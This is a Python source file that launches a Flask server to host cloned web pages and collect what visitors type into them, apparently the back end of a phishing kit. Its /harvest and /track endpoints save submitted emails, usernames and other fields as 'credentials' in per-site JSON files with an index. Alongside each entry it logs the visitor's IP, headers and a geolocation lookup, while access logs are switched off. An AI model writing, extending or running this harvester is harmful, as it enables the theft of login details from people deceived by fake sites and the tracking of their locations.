import os
import sys
import subprocess
import time
import atexit
import signal
import socket
import json
import datetime
import re

def launch_flask_server(site_root, main_file_rel, site_credentials_dir, port=8080):
    os.makedirs(site_credentials_dir, exist_ok=True)

    server_script = """
import logging
# === SUPPRESS FLASK'S VERBOSE ACCESS LOGS ===
logging.getLogger('werkzeug').setLevel(logging.ERROR)

from flask import Flask, request, send_file, send_from_directory, jsonify, abort, make_response
import os, json, datetime, re

app = Flask(__name__)
SITE_ROOT = r"{SITE_ROOT}"
CREDS_DIR = r"{CREDS_DIR}"

def get_geoip_data(ip):
    try:
        import requests
        response = requests.get(f"http://ip-api.com/json/{{ip}}", timeout=2)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {{
                    'country': data.get('country'),
                    'country_code': data.get('countryCode'),
                    'region': data.get('regionName'),
                    'city': data.get('city'),
                    'zip': data.get('zip'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'timezone': data.get('timezone'),
                    'isp': data.get('isp'),
                    'org': data.get('org'),
                    'as': data.get('as')
                }}
    except:
        pass
    return None

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_client_info():
    client_ip = get_client_ip()
    info = {{
        'ip': client_ip,
        'remote_addr': request.remote_addr,
        'x_forwarded_for': request.headers.get('X-Forwarded-For'),
        'x_real_ip': request.headers.get('X-Real-IP'),
        'user_agent': request.headers.get('User-Agent'),
        'accept_language': request.headers.get('Accept-Language'),
        'referer': request.headers.get('Referer'),
        'accept': request.headers.get('Accept'),
        'accept_encoding': request.headers.get('Accept-Encoding'),
        'host': request.headers.get('Host'),
        'origin': request.headers.get('Origin'),
        'timestamp': str(datetime.datetime.now())
    }}
    geo_data = get_geoip_data(client_ip)
    if geo_data:
        info['geo'] = geo_data
    return info

def extract_username_from_data(data):
    username_keys = ['email', 'username', 'user', 'login', 'user_id', 'name', 'account']
    for key in username_keys:
        if key in data and data[key] and str(data[key]).strip():
            val = str(data[key]).strip()
            # Allow @ and + in emails
            safe = "".join(c for c in val if c.isalnum() or c in '._-+@')
            return safe
    return "unknown"

def save_credentials(data, site, session_id):
    # === FIXED: Save directly into CREDS_DIR (which is already the site folder) ===
    site_dir = CREDS_DIR  
    os.makedirs(site_dir, exist_ok=True)
    
    username = extract_username_from_data(data)
    if len(username) > 40:
        username = username[:40]
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
    filename = site + "_" + username + "_" + timestamp + ".json"
    filepath = os.path.join(site_dir, filename)
    
    entry = {{
        "id": filename.replace('.json', ''),
        "timestamp": datetime.datetime.now().isoformat(),
        "session_id": session_id,
        "site": site,
        "data": data,
        "client_info": get_client_info(),
        "server_info": {{
            "host": request.host,
            "path": request.path,
            "method": request.method,
            "remote_addr": request.remote_addr
        }}
    }}
    
    with open(filepath, 'w') as f:
        json.dump(entry, f, indent=2)
    
    # Update index
    index_file = os.path.join(site_dir, "all_credentials_index.json")
    try:
        if os.path.exists(index_file):
            with open(index_file, 'r') as f:
                index_data = json.load(f)
        else:
            index_data = []
    except:
        index_data = []
    
    data_summary = {{}}
    for key, value in data.items():
        if isinstance(value, (str, int, float, bool)):
            val_str = str(value)
            data_summary[key] = val_str[:50] + "..." if len(val_str) > 50 else val_str
    
    index_entry = {{
        "file": filename,
        "timestamp": str(datetime.datetime.now()),
        "username": username,
        "site": site,
        "session_id": session_id,
        "data_summary": data_summary
    }}
    
    index_data.append(index_entry)
    with open(index_file, 'w') as f:
        json.dump(index_data, f, indent=2)
    
    print("[*] Credential saved to " + filename)
    return filename

@app.route('/')
def index():
    index_path = os.path.join(SITE_ROOT, 'index.html')
    if os.path.isfile(index_path):
        return serve_html_file('index.html')
    for root, dirs, files in os.walk(SITE_ROOT):
        for f in files:
            if f.lower().endswith('.html'):
                rel_path = os.path.relpath(os.path.join(root, f), SITE_ROOT)
                return serve_html_file(rel_path)
    return abort(404)

@app.route('/<path:path>')
def serve_any_file(path):
    abs_path = os.path.abspath(os.path.join(SITE_ROOT, path))
    if not abs_path.startswith(SITE_ROOT):
        return abort(403)
    if os.path.isdir(abs_path):
        index_file = os.path.join(abs_path, 'index.html')
        if os.path.isfile(index_file):
            rel_path = os.path.relpath(index_file, SITE_ROOT)
            return serve_html_file(rel_path)
        return abort(404)
    if abs_path.lower().endswith('.html') and os.path.isfile(abs_path):
        rel_path = os.path.relpath(abs_path, SITE_ROOT)
        return serve_html_file(rel_path)
    if os.path.isfile(abs_path):
        return send_from_directory(SITE_ROOT, path)
    return abort(404)

def serve_html_file(relpath):
    abs_path = os.path.join(SITE_ROOT, relpath)
    if not os.path.isfile(abs_path):
        return abort(404)
    response = make_response(send_file(abs_path))
    response.headers["Content-Type"] = "text/html; charset=utf-8"
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return response

@app.route('/harvest', methods=['POST'])
@app.route('/track', methods=['POST'])
def harvest():
    try:
        session_id = request.headers.get('X-Session-ID', 'unknown')
        site = request.headers.get('X-Site', os.path.basename(CREDS_DIR))
        
        data = request.get_json(silent=True)
        if not data:
            data = request.form.to_dict()
        
        if isinstance(data, dict):
            if 'events' in data and isinstance(data['events'], list):
                for event in data['events']:
                    save_event(event, site, session_id)
                return jsonify({{"status": "events_received", "count": len(data['events'])}}), 200
            else:
                filename = save_credentials(data, site, session_id)
                return jsonify({{"status": "success", "file": filename}}), 200
        elif isinstance(data, str) and data.strip():
            filename = save_credentials({{"raw": data.strip()}}, site, session_id)
            return jsonify({{"status": "raw_saved", "file": filename}}), 200
        else:
            return jsonify({{"status": "error", "message": "No valid data received"}}), 400
            
    except Exception as e:
        import traceback
        print("[*] Harvest Exception:", str(e))
        print(traceback.format_exc())
        return jsonify({{"status": "error", "message": str(e)}}), 500

def save_event(event, site, session_id):
    site_dir = os.path.join(CREDS_DIR, site)
    os.makedirs(site_dir, exist_ok=True)
    
    events_file = os.path.join(site_dir, "tracking_events.json")
    
    try:
        if os.path.exists(events_file):
            with open(events_file, 'r') as f:
                events = json.load(f)
        else:
            events = []
    except:
        events = []
    
    events.append(event)
    if len(events) > 1000:
        events = events[-1000:]
    
    with open(events_file, 'w') as f:
        json.dump(events, f, indent=2)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port={PORT}, debug=False)
""".format(
        SITE_ROOT=os.path.abspath(site_root).replace('\\', '/'),
        CREDS_DIR=os.path.abspath(site_credentials_dir).replace('\\', '/'),
        PORT=port
    )
    
    proc = subprocess.Popen(
        [sys.executable, "-c", server_script],
        stdout=None,
        stderr=None,
        stdin=subprocess.PIPE
    )

    def cleanup():
        try:
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=1)
        except:
            pass

    atexit.register(cleanup)
    signal.signal(signal.SIGINT, lambda *_: cleanup() or sys.exit(0))

    for _ in range(30):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('localhost', port)) == 0:
                return proc
        time.sleep(0.3)

    cleanup()
    raise RuntimeError("Flask server failed to start")
